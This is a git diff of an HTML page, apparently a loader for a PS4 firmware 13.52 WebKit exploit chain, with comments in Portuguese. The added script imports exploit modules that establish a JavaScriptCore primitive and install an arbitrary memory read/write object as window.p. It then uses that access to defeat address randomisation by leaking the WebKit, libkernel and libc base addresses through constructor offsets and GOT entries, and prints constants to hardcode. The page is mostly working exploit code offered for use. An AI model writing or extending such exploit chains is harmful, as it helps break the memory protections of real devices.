@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -21,7 +20,7 @@ h1{font-size:16px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;marg
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
 #st{font-size:12px;color:#bbb;flex:1}
 
-#con{width:100%;max-width:700px;height:320px;background:#050508;border:1px solid #1a1a2e;
+#con{width:100%;max-width:700px;height:340px;background:#050508;border:1px solid #1a1a2e;
   border-radius:6px;overflow-y:auto;padding:8px 10px;font-size:11px;line-height:1.6;margin-bottom:10px}
 .l{padding:1px 0;word-break:break-all}
 .li{color:#5b9bd5}.lo{color:#00c853;font-weight:bold}.lw{color:#f0a500}
@@ -54,15 +53,27 @@ h1{font-size:16px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;marg
   <div class="card"><div class="cl">__ps5NativeCtor</div><div class="cv" id="c-ct">—</div></div>
 </div>
 
-<!-- Dependências do slopkit -->
-<script src="resources/int64.js"></script>
-<script src="resources/core.js"></script>
-<script src="resources/mem.js" type="module"></script>
+<!-- ════════════════════════════════════════════════════════════════
+     ES MODULE INLINE — importa tudo diretamente (padrão slopkit)
+     NÃO use <script src=""> para módulos ES6!
+     ════════════════════════════════════════════════════════════════ -->
+<script type="module">
+import { int64 }              from './resources/int64.js';
+import { establishPrimitive } from './resources/core.js?v=10';
+import { installWindowP }     from './resources/mem.js';
 
-<!-- O main.js carrega ./13.52.js dinamicamente -->
-<script src="resources/main.js"></script>
+// Carrega offsets dinamicamente (padrão slopkit)
+const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(navigator.userAgent);
+const fwStr   = fwMatch ? fwMatch[1] : '';
 
-<script>
+let offsets = null;
+try {
+  offsets = await import(`./${fwStr}.js`);
+} catch(e) {
+  log(`[-] Falha ao carregar offsets ${fwStr}.js: ${e.message}`, 'le');
+}
+
+/* ─── UI helpers ─────────────────────────────────────────── */
 const $con = document.getElementById('con');
 const $dot = document.getElementById('dot');
 const $st  = document.getElementById('st');
@@ -73,26 +84,168 @@ function log(msg, cls='li') {
   d.textContent = msg;
   $con.appendChild(d);
   $con.scrollTop = $con.scrollHeight;
+  while ($con.children.length > 600) $con.removeChild($con.firstChild);
 }
+function logH(msg) { log('=== ' + msg + ' ===', 'ls'); }
 function setStatus(msg, state='r') {
   $st.textContent = msg;
   $dot.className = state;
 }
 function setCard(id, val) {
   const el = document.getElementById(id);
-  if(el){el.textContent=val;el.style.color='#00ff88';}
+  if (el) { el.textContent = val; el.style.color = '#00ff88'; }
 }
 
-// Expor helpers globalmente para o main.js usar
-window._hostLog = log;
-window._hostSetStatus = setStatus;
-window._hostSetCard = setCard;
+/* ─── int64 helpers ─────────────────────────────────────── */
+function i64n(a) { return a.hi * 0x100000000 + a.low; }
+function n64(n) {
+  const hi = Math.floor(n / 0x100000000) >>> 0;
+  const lo = (n - hi * 0x100000000) >>> 0;
+  return new int64(lo, hi);
+}
+function validPtr(a) { return a.hi > 0 && a.hi <= 0xFF && a.low > 0; }
 
-log('=== PS4 13.52 Slopkit Port ===', 'ls');
-log('Aguardando core.js + mem.js...', 'li');
+/* ─── MAIN: leak de bases (método slopkit) ──────────────── */
+async function main(p) {
+  logH('LEAK DE BASES');
 
-// O main.js do slopkit vai chamar prepare() e main() automaticamente
-// quando o 13.52.js for carregado. Não precisamos fazer nada aqui.
+  // Verifica __ps5NativeCtor
+  const ctorRaw = globalThis.__ps5NativeCtor;
+  if (typeof ctorRaw !== 'number' || ctorRaw <= 0x100000000) {
+    log('[-] __ps5NativeCtor não disponível', 'le');
+    setStatus('Falha: __ps5NativeCtor indisponível', 'e');
+    return;
+  }
+  const ctorPtr = n64(ctorRaw);
+  log('[+] __ps5NativeCtor: 0x' + ctorPtr.toString(), 'lo');
+  setCard('c-ct', '0x' + ctorPtr.toString());
+  document.getElementById('cards').classList.add('v');
+
+  // Calcula base via host constructor candidates (método slopkit)
+  let webkitBase = null;
+  let matchedCandidate = null;
+
+  if (offsets && offsets.OFFSET_wk_host_constructor_candidates) {
+    for (const hc of offsets.OFFSET_wk_host_constructor_candidates) {
+      if (hc === 0x00000000) continue;
+      const wb = ctorRaw - hc;
+      log(`  Testando candidate 0x${hc.toString(16)} => base=0x${wb.toString(16)}`, 'ld');
+
+      // Validação: range userland + page aligned
+      if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
+        webkitBase = n64(wb);
+        matchedCandidate = hc;
+        log(`[+] Base validada! candidate=0x${hc.toString(16)}`, 'lo');
+        break;
+      }
+    }
+  }
+
+  if (!webkitBase) {
+    log('[-] Nenhum host-constructor candidate validou', 'le');
+    log('    Verifique OFFSET_wk_host_constructor_candidates no 13.52.js', 'lw');
+    setStatus('Falha: offsets incorretos', 'e');
+    return;
+  }
+
+  log('[+] WebKit Base: 0x' + webkitBase.toString(), 'lo');
+  setCard('c-wk', '0x' + webkitBase.toString());
+
+  // Verifica ELF magic
+  try {
+    const magic = p.read4(webkitBase);
+    if (magic === 0x464C457F) {
+      log('[+] ELF magic confirmado no base ✓', 'lo');
+    } else {
+      log(`[!] ELF magic inesperado: 0x${magic.toString(16)} (esperado 0x464C457F)`, 'lw');
+      log('    O offset pode estar ligeiramente errado — tente ajustar', 'lw');
+    }
+  } catch(_) {
+    log('[!] Não conseguiu ler ELF magic — offset pode estar errado', 'lw');
+  }
+
+  // Leak libs via GOT (se offsets disponíveis)
+  if (offsets.OFFSET_wk___stack_chk_guard_import && offsets.OFFSET_lk___stack_chk_guard) {
+    try {
+      const libKernelBase = p.read8(webkitBase.add32(offsets.OFFSET_wk___stack_chk_guard_import));
+      libKernelBase.sub32inplace(offsets.OFFSET_lk___stack_chk_guard);
+      log('[+] libKernelBase: 0x' + libKernelBase.toString(), 'lo');
+      setCard('c-lk', '0x' + libKernelBase.toString());
+    } catch(e) {
+      log('[-] Falha ao leak libkernel: ' + e.message, 'lw');
+    }
+  }
+
+  if (offsets.OFFSET_wk_memset_import && offsets.OFFSET_lc_memset) {
+    try {
+      const libSceLibcInternalBase = p.read8(webkitBase.add32(offsets.OFFSET_wk_memset_import));
+      libSceLibcInternalBase.sub32inplace(offsets.OFFSET_lc_memset);
+      log('[+] libcBase: 0x' + libSceLibcInternalBase.toString(), 'lo');
+      setCard('c-lc', '0x' + libSceLibcInternalBase.toString());
+    } catch(e) {
+      log('[-] Falha ao leak libc: ' + e.message, 'lw');
+    }
+  }
+
+  // Mostra constants para hardcode
+  const baseN = i64n(webkitBase);
+  const ctorRva = i64n(ctorPtr) - baseN;
+  log('', 'li');
+  log('// ═══ HARDCODE CONSTANTS (copie para 13.52.js) ═══', 'lo');
+  log(`const WEBKIT_CTOR_RVA = 0x${ctorRva.toString(16).toUpperCase()};`, 'la');
+  log('// const webkitBase = __ps5NativeCtor - WEBKIT_CTOR_RVA;', 'ld');
+
+  setStatus('Bases encontradas ✓', 'ok');
+  globalThis._exploit = { webkitBase, ctorPtr };
+}
+
+/* ─── BOOT ──────────────────────────────────────────────── */
+(async () => {
+  log(`UA: ${navigator.userAgent.slice(0,80)}`, 'ld');
+  log(`Firmware: ${fwStr || 'desconhecido'}`, 'li');
+  log('', 'li');
+
+  setStatus('Executando exploit JSC...', 'r');
+  logH('EXPLOIT JSC (core.js)');
+
+  let carrier;
+  try {
+    carrier = await establishPrimitive({
+      onEvent(tag, det, att) {
+        const verbose = ['PAIR-REPROVED','PAIR-COMMIT','PAIR-WIDENED','PAIR-CELLS',
+          'PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER','PAIR-MAIN-RECORD','PAIR-RELEASE'];
+        if (verbose.includes(tag)) { log('  ' + tag + ': ' + det, 'ld'); return; }
+        const isOk = tag.includes('UP') || tag.includes('OK');
+        log('[' + tag + '] ' + det, isOk ? 'lo' : 'li');
+      },
+      maxAttempts: 0
+    });
+  } catch(err) {
+    setStatus('core.js falhou: ' + err.message, 'e');
+    log('[ERRO] ' + err.message, 'le');
+    return;
+  }
+  log('[+] Primitivo JSC estabelecido!', 'lo');
+
+  logH('PRIMITIVA R/W (mem.js)');
+  setStatus('Instalando primitiva R/W...', 'r');
+
+  let p;
+  try {
+    p = installWindowP(carrier, {
+      promote: true,
+      onEvent(tag, det) { log('  [mem/' + tag + '] ' + det, 'ld'); }
+    });
+  } catch(err) {
+    setStatus('mem.js falhou: ' + err.message, 'e');
+    log('[ERRO] ' + err.message, 'le');
+    return;
+  }
+  log('[+] R/W arbitrário: window.p instalado', 'lo');
+  window.p = p;
+
+  await main(p);
+})();
 </script>
 </body>
 </html>
